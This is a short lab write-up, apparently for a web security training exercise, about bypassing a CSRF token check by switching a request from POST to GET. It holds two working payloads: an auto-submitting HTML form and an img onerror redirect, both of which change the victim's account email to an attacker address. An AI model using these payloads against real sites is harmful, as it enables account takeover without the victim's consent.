# Lab: CSRF where token validation depends on request method


The check to verify the csrf token can be bypass if you change the request method. (POST to GET)


## payload 1
```html

<form id="mon-formulaire" name="change-email-form" action="https://MYLAB.web-security-academy.net/my-account/change-email" method="GET">
    <input required type="email" name="email" value="wieneristheboss@evil.corp.com">
    <button class='button' type='submit'> Update email </button>
 </form>

<script>
    let formulaire = document.getElementById("mon-formulaire");
    formulaire.submit();
</script>

```
## payload 2 via img tag

```html

<img src=x onerror=document.location="https://MYLAB.web-security-academy.net/my-account/change-email?email=jey@evil.heheh.com">

```


